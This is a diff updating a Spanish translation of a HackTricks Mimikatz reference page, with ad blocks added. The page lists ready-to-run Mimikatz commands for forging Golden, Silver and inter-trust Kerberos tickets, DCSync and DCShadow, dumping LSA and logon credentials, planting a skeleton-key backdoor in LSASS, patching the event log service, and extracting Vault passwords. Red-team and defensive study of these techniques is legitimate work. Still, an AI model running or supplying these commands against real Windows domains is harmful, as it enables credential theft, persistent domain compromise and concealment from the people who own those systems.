@@ -15,9 +15,16 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Profundiza tu experiencia en **Seguridad Móvil** con 8kSec Academy. Domina la seguridad de iOS y Android a través de nuestros cursos autoguiados y obtén certificación:
+
+{% embed url="https://academy.8ksec.io/" %}
+
+
 **Esta página se basa en una de [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. ¡Consulta el original para más información!
 
-## LM y Contraseñas en texto claro en memoria
+## LM y texto claro en memoria
 
 Desde Windows 8.1 y Windows Server 2012 R2 en adelante, se han implementado medidas significativas para proteger contra el robo de credenciales:
 
@@ -25,11 +32,11 @@ Desde Windows 8.1 y Windows Server 2012 R2 en adelante, se han implementado medi
 
 - **La Protección LSA** se introduce para proteger el proceso de la Autoridad de Seguridad Local (LSA) de la lectura no autorizada de memoria y la inyección de código. Esto se logra marcando el LSASS como un proceso protegido. La activación de la Protección LSA implica:
 1. Modificar el registro en _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ configurando `RunAsPPL` a `dword:00000001`.
-2. Implementar un Objeto de Política de Grupo (GPO) que haga cumplir este cambio de registro en los dispositivos gestionados.
+2. Implementar un Objeto de Política de Grupo (GPO) que haga cumplir este cambio de registro en dispositivos gestionados.
 
 A pesar de estas protecciones, herramientas como Mimikatz pueden eludir la Protección LSA utilizando controladores específicos, aunque tales acciones probablemente se registren en los registros de eventos.
 
-### Contrarrestando la Eliminación de SeDebugPrivilege
+### Contrarrestando la eliminación de SeDebugPrivilege
 
 Los administradores suelen tener SeDebugPrivilege, lo que les permite depurar programas. Este privilegio puede ser restringido para evitar volcado de memoria no autorizado, una técnica común utilizada por los atacantes para extraer credenciales de la memoria. Sin embargo, incluso con este privilegio eliminado, la cuenta TrustedInstaller aún puede realizar volcado de memoria utilizando una configuración de servicio personalizada:
 ```bash
@@ -61,7 +68,7 @@ La manipulación de registros de eventos en Mimikatz implica dos acciones princi
 - El comando `event::drop` luego parchea el servicio de Registro de Eventos.
 
 
-### Ataques de Tickets de Kerberos
+### Ataques de Tickets Kerberos
 
 ### Creación de Golden Ticket
 
@@ -84,9 +91,9 @@ mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-1234567
 
 Los Silver Tickets otorgan acceso a servicios específicos. Comando clave y parámetros:
 
-- Comando: Similar al Golden Ticket pero se dirige a servicios específicos.
+- Comando: Similar al Golden Ticket pero apunta a servicios específicos.
 - Parámetros:
-- `/service`: El servicio a atacar (por ejemplo, cifs, http).
+- `/service`: El servicio a apuntar (por ejemplo, cifs, http).
 - Otros parámetros similares al Golden Ticket.
 
 Ejemplo:
@@ -106,37 +113,37 @@ Ejemplo:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
-### Additional Kerberos Commands
+### Comandos Adicionales de Kerberos
 
-- **Listing Tickets**:
-- Command: `kerberos::list`
-- Lista todos los tickets de Kerberos para la sesión de usuario actual.
+- **Listar Tickets**:
+- Comando: `kerberos::list`
+- Lista todos los tickets de Kerberos para la sesión actual del usuario.
 
-- **Pass the Cache**:
-- Command: `kerberos::ptc`
+- **Pasar la Caché**:
+- Comando: `kerberos::ptc`
 - Inyecta tickets de Kerberos desde archivos de caché.
-- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- Ejemplo: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-- **Pass the Ticket**:
-- Command: `kerberos::ptt`
+- **Pasar el Ticket**:
+- Comando: `kerberos::ptt`
 - Permite usar un ticket de Kerberos en otra sesión.
-- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- Ejemplo: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Purge Tickets**:
-- Command: `kerberos::purge`
-- Borra todos los tickets de Kerberos de la sesión.
+- **Purgar Tickets**:
+- Comando: `kerberos::purge`
+- Limpia todos los tickets de Kerberos de la sesión.
 - Útil antes de usar comandos de manipulación de tickets para evitar conflictos.
 
 
-### Active Directory Tampering
+### Manipulación de Active Directory
 
 - **DCShadow**: Hacer que una máquina actúe temporalmente como un DC para la manipulación de objetos de AD.
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Imitar un DC para solicitar datos de contraseña.
+- **DCSync**: Imitar un DC para solicitar datos de contraseñas.
 - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Credential Access
+### Acceso a Credenciales
 
 - **LSADUMP::LSA**: Extraer credenciales de LSA.
 - `mimikatz "lsadump::lsa /inject" exit`
@@ -156,12 +163,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **LSADUMP::Trust**: Recuperar información de autenticación de confianza.
 - `mimikatz "lsadump::trust" exit`
 
-### Miscellaneous
+### Varios
 
 - **MISC::Skeleton**: Inyectar un backdoor en LSASS en un DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### Privilege Escalation
+### Escalación de Privilegios
 
 - **PRIVILEGE::Backup**: Adquirir derechos de respaldo.
 - `mimikatz "privilege::backup" exit`
@@ -169,7 +176,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **PRIVILEGE::Debug**: Obtener privilegios de depuración.
 - `mimikatz "privilege::debug" exit`
 
-### Credential Dumping
+### Volcado de Credenciales
 
 - **SEKURLSA::LogonPasswords**: Mostrar credenciales de usuarios conectados.
 - `mimikatz "sekurlsa::logonpasswords" exit`
@@ -177,16 +184,16 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SEKURLSA::Tickets**: Extraer tickets de Kerberos de la memoria.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Sid and Token Manipulation
+### Manipulación de SID y Token
 
 - **SID::add/modify**: Cambiar SID y SIDHistory.
-- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Modify: *No se proporciona un comando específico para modificar en el contexto original.*
+- Agregar: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- Modificar: *No se proporciona un comando específico para modificar en el contexto original.*
 
 - **TOKEN::Elevate**: Suplantar tokens.
 - `mimikatz "token::elevate /domainadmin" exit`
 
-### Terminal Services
+### Servicios de Terminal
 
 - **TS::MultiRDP**: Permitir múltiples sesiones RDP.
 - `mimikatz "ts::multirdp" exit`
@@ -194,23 +201,29 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **TS::Sessions**: Listar sesiones TS/RDP.
 - *No se proporciona un comando específico para TS::Sessions en el contexto original.*
 
-### Vault
+### Bóveda
 
-- Extraer contraseñas del Windows Vault.
+- Extraer contraseñas de Windows Vault.
 - `mimikatz "vault::cred /patch" exit`
 
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Profundiza tu experiencia en **Seguridad Móvil** con 8kSec Academy. Domina la seguridad de iOS y Android a través de nuestros cursos autoguiados y obtén certificación:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Apoya a HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 {% endhint %}
